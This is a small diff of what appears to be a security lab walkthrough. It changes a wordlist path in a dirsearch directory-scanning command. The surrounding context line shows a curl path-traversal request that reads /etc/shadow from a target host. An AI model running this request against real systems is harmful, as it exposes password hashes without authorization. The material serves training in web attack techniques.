@@ -111,7 +111,7 @@ curl --insecure https://<Point IP>/\?filename\=../../../etc/shadow
 
 Bonus step: search for additional web path:
 ```
-dirsearch --wordlists=/home/student/wordlists/directories.txt -u https://<Point IP>/ 
+dirsearch --wordlists=/home/user/wordlists/directories.txt -u https://<Point IP>/ 
 ```
 
 Reference: [dirsearch](https://github.com/maurosoria/dirsearch)
